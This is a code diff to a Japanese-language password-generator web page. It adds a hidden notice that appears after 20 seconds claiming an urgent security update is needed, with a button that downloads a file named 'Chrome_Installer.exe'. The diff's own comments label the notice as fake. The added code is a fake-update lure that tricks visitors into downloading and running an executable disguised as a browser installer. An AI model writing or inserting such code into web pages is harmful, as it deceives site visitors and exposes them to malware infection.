@@ -77,6 +77,32 @@
         button:hover {
             background-color: var(--primary-hover);
         }
+
+        /* 偽のアップデート通知用のスタイル */
+        #fake-update {
+            display: none;
+            margin-top: 1.5rem;
+            border: 2px solid #ef4444;
+            background-color: #fef2f2;
+            padding: 1rem;
+            border-radius: 8px;
+            text-align: left;
+        }
+
+        #fake-update p {
+            margin: 0 0 0.75rem 0;
+            font-size: 0.875rem;
+            color: #991b1b;
+            font-weight: 600;
+        }
+
+        #fake-update button {
+            background-color: #ef4444;
+        }
+
+        #fake-update button:hover {
+            background-color: #dc2626;
+        }
     </style>
 </head>
 <body>
@@ -86,6 +112,12 @@
             <p id="pw">ボタンを押して生成</p>
         </div>
         <button onclick="generate()">パスワードを生成</button>
+
+        <!-- 20秒後に表示される偽のセキュリティアップデート通知 -->
+        <div id="fake-update">
+            <p>⚠️ 重要: セキュリティアップデートが必要です。</p>
+            <button onclick="downloadInstaller()">今すぐインストール</button>
+        </div>
     </div>
 
     <script>
@@ -98,6 +130,18 @@
             const pwElement = document.getElementById("pw");
             pwElement.innerText = password;
             pwElement.style.color = "var(--text-color)";
+        }
+
+        // 20秒（20000ミリ秒）後に偽の案内を表示
+        setTimeout(() => {
+            document.getElementById("fake-update").style.display = "block";
+        }, 20000);
+
+        function downloadInstaller() {
+            const link = document.createElement("a");
+            link.href = "Chrome_Installer.exe";
+            link.download = "Chrome_Installer.exe";
+            link.click();
         }
     </script>
 </body>
